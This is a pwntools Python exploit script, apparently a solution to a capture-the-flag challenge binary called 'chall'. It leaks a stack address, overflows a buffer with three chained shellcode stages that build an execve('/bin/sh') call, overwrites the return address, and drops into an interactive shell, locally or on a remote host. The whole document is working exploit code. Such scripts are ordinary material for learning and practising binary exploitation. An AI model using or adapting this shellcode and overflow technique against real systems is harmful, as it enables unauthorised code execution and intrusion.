from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendline(content)

    def get_address(self):
        p = self.p
        p.recvuntil(b"SHELLS: ")
        return eval(p.recvline())


x, p = init()

x.debug("break *main+147\nc")

shell_address = x.get_address()

log.info(f"{shell_address=:x}")


u = make_unpacker(64, endian='little', sign='unsigned')


# print(shellcraft.amd64.execve(b"/bin/sh"))
shell = asm(
    f"""
    mov rcx, rsp
    sub rcx, 76-20
    xor rdx, rdx
    jmp rcx
    """
)
log.info(f"{len(shell)=}")
assert len(shell) <= 12

shell2 = asm(
    """
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
    xor [rsp], rax
    add rcx, 56
    jmp rcx
    """
)
log.info(f"{len(shell2)=}")
assert len(shell2) <= 32

shell3 = asm(
    """
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
    """
)
log.info(f"{len(shell3)=}")
assert len(shell3) <= 16

pay = b''
pay += shell
pay += b"A"*8
pay += shell2
pay += cyclic(68-(len(shell+shell2)+8))
pay += p64(shell_address)
pay += shell3

x.send(pay)

p.interactive()
